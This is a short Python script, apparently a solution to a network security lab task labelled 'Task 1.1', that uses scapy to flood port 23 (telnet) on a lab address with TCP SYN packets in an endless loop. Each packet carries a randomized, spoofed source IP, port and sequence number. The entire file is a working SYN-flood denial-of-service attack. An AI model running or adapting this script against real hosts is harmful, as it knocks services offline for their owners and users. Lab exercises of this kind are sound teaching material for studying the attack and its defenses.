#!/usr/bin/env python3

# Task 1.1 ----------------------------------------------------


from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5") #set to victim ip addr
tcp = TCP(dport=23, flags='S') # set to telnet 23 port
pkt = ip/tcp

while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source ip
  pkt[TCP].sport = getrandbits(16) # source port
  pkt[TCP].seq = getrandbits(32) # sequence number
  send(pkt, iface = 'br-5f9aa6b242e3', verbose = 0)